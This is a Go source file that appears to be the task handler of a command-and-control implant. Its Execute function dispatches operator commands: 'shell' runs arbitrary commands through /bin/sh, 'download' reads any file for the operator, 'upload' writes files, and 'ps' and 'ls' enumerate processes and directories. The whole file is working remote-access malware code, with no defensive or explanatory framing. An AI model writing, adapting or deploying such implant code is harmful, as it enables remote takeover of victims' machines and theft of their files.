package handler

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Execute dispatches a C2 task command and returns the raw output bytes.
func Execute(command, args string) []byte {
	switch command {
	case "shell":
		return runShell(args)
	case "ls":
		return listDir(args)
	case "ps":
		return listProcs()
	case "download":
		return readFile(args)
	case "upload":
		parts := strings.SplitN(args, " ", 2)
		if len(parts) == 2 {
			return writeFile(parts[0], []byte(parts[1]))
		}
	case "whoami":
		return runShell("id")
	case "pwd":
		dir, _ := os.Getwd()
		return []byte(dir)
	}
	return []byte(fmt.Sprintf("unknown command: %s", command))
}

func runShell(cmd string) []byte {
	var out bytes.Buffer
	c := exec.Command("/bin/sh", "-c", cmd)
	c.Stdout = &out
	c.Stderr = &out
	c.Run()
	return out.Bytes()
}

func listDir(path string) []byte {
	if path == "" {
		path = "."
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return []byte(err.Error())
	}
	var sb strings.Builder
	for _, e := range entries {
		info, _ := e.Info()
		if info != nil {
			sb.WriteString(fmt.Sprintf("%s\t%d\t%s\n",
				filepath.Join(path, e.Name()), info.Size(), info.Mode()))
		}
	}
	return []byte(sb.String())
}

func listProcs() []byte {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return []byte(err.Error())
	}
	var sb strings.Builder
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := e.Name()
		comm, err := os.ReadFile(fmt.Sprintf("/proc/%s/comm", pid))
		if err != nil {
			continue
		}
		cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%s/cmdline", pid))
		cmdlineStr := strings.ReplaceAll(string(cmdline), "\x00", " ")
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\n",
			pid, strings.TrimSpace(string(comm)), strings.TrimSpace(cmdlineStr)))
	}
	return []byte(sb.String())
}

func readFile(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		return []byte(err.Error())
	}
	return data
}

func writeFile(path string, data []byte) []byte {
	if err := os.WriteFile(path, data, 0644); err != nil {
		return []byte(err.Error())
	}
	return []byte("ok")
}
